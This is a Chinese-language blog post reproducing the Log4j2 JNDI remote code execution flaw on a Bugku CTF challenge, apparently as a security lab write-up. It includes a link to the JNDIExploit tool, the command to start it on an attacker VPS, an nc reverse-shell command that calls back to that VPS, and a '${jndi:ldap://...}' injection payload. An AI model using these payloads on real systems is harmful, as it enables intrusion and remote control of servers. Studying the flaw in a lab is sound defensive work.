---
title: Log4j2_RCE漏洞复现
comments: true
tags:
  - Log4j2_RCE
  - cve
categories: cve
keywords: Log4j2
top_img: 'https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/log4j-0.png'
cover: 'https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/log4j-0.png'
abbrlink: 80c2d2
date: 2021-12-20 10:58:30
---

#  Log4j2_RCE漏洞复现

## 漏洞简介

Apache **Log4j2**是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。

漏洞适用版本为`2.0 <= Apache log4j2 <= 2.14.1`，只需检测Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。

## 复现过程

本文复现地址

[https://ctf.bugku.com/challenges/detail/id/340.html](https://ctf.bugku.com/challenges/detail/id/340.html)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/log4j-1.png)

使用工具

[https://gitee.com/bjmlw2021/JNDIExploit/tree/master](https://gitee.com/bjmlw2021/JNDIExploit/tree/master)

https://zhiji.lanzoul.com/iwGopxrn27c
密码:8r02

将利用工具上传至自己的公网vps

开启ldap和http服务监听

```
java -jar JNDIExploit-master.jar -i 自己公网vps的ip
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/log4j-2.png)

另开终端，nc开启监听

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/log4j-3.png)



base64加密反弹shell命令

```
nc 公网vps的ip 12345 -e /bin/sh
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/log4j-5.png)

进行jndi注入攻击

```java
${jndi:ldap://x.x.x.x:1389/Basic/Command/Base64/[base64加密后命令]}
```

在关卡页面，输入payload,密码随意。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/log4j-4.png)

成功反弹shell

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/log4j-6.png)
